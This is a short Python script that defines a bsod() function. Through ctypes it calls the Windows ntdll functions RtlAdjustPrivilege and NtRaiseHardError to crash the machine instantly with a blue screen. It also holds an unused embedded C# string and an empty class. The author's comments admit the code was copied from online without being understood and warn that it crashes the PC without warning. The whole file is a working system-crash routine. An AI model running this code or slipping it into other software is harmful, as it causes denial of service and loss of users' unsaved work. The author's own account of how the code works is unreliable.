import ctypes


# note here: I have no idea how this works (but somehow it DOES work).
# I just found this piece of code online once and then ported it from PowerShell to python.
# DO NOT TEST THIS ON YOUR PC IF YOU HAVE ANYTHING IMPORTANT OPENED, IT WILL CRASH YOUR PC INSTANTLY AND WITHOUT WARNING
# -- baer1 (baerchen201)


def bsod():
    source = (
        "\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class CS{\n"
        '    [DllImport("ntdll.dll")]\n'
        "    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, "
        "bool IsThreadPrivilege, out bool PreviousValue);\n"
        '    [DllImport("ntdll.dll")]\n'
        "    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, "
        "uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);\n"
        "    public static unsafe void Kill(){\n"
        "        Boolean tmp1;\n"
        "        uint tmp2;\n"
        "        RtlAdjustPrivilege(19, true, false, out tmp1);\n"
        "        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);\n"
        "    }\n"
        "}\n"
    )

    class CS(ctypes.Structure):
        pass

    CS_Kill = ctypes.windll.ntdll.NtRaiseHardError
    CS_Kill.argtypes = [
        ctypes.c_uint,
        ctypes.c_uint,
        ctypes.c_uint,
        ctypes.c_void_p,
        ctypes.c_uint,
        ctypes.POINTER(ctypes.c_uint),
    ]
    tmp1 = ctypes.c_bool()
    tmp2 = ctypes.c_uint()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(tmp1))
    CS_Kill(0xC0000022, 0, 0, None, 6, ctypes.byref(tmp2))
